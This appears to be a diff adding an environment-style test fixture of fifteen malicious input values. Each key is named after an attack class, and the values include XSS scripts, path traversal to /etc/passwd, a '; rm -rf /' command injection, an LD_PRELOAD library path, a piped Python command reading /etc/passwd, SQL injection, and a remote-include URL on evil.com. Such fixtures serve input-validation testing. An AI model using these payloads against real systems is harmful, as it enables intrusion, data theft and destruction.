@@ -1,0 +1,15 @@
+API_KEY=<script>alert('xss')</script>
+SECRET=../../../etc/passwd
+TOKEN=javascript:alert('xss')
+COMMAND=; rm -rf /
+PATH=../../../../bin/bash
+LD_PRELOAD=/path/to/malicious.so
+EXEC=|/usr/bin/python -c 'import os; os.system("cat /etc/passwd")'
+EVAL=); eval('malicious code'); /*
+INJECTION=' OR 1=1--
+XSS=<img src=x onerror=alert(1)>
+LFI=../../../../etc/passwd
+RFI=http://evil.com/shell.php
+XXE=<!ENTITY xxe SYSTEM "file:///etc/passwd">
+SSTI={{config.items()}}
+TEMPLATE=${7*7}
